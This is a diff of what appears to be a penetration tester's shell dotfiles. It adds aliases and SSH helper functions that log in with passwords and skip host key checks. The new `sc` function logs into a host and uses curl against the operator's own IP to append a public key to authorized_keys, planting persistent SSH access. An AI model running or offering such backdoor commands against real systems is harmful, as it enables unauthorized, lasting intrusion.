@@ -49,10 +49,12 @@ alias vi='nvim'
 alias py='python3'
 alias cdw='cd $WORKDIR'
 alias target='echo "$@" > /home/$NUSER/.target'
+alias IP=$'ip link show tun0 &>/dev/null && ip addr show tun0 | grep \'inet \' | awk \'{ print $2 }\' | cut -d/ -f1|| hostname -I | awk \'{ print $1 }\''
 alias stty-size='echo -e "stty rows $(tput lines) columns $(tput cols)\nexport TERM=xterm\nexport SHELL=/bin/bash"'
 alias http='python3 -m http.server'
 alias smb='impacket-smbserver -smb2support -username $USER -password $USER'
 alias vpn='sudo openvpn'
+alias p='proxychains -q'
 alias c='xsel -bi'
 
 # Functions
@@ -74,10 +76,30 @@ bloodhound () {
     fi
 }
 
-s () {
-    if [ $# -ne 2 ]; then
-        echo "[!] Usage: s <user>@<host> <password>"
+s() {
+    if [ $# -lt 2 ]; then
+        echo '[!] Usage: s [options] <user>@<host> <password>'
         return 1
     fi
-    sshpass -p "$2" ssh -o StrictHostKeyChecking=no -o GlobalKnownHostsFile=/dev/null -o UserKnownHostsFile=/dev/null "$1"
+
+    args=("$@")
+    password="${args[-1]}"
+    unset 'args[-1]'
+
+    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
+                              -o GlobalKnownHostsFile=/dev/null \
+                              -o UserKnownHostsFile=/dev/null \
+                              "${args[@]}"
+}
+
+sc() {
+    if [ $# -lt 2 ]; then
+        echo '[!] Usage: sc <user>@<host> <password>'
+        return 1
+    fi
+
+    sshpass -p "$2" ssh -o StrictHostKeyChecking=no \
+                              -o GlobalKnownHostsFile=/dev/null \
+                              -o UserKnownHostsFile=/dev/null \
+                              "$1" "curl -s http://$(IP)/shells/id_rsa.pub >> ~/.ssh/authorized_keys"
 }
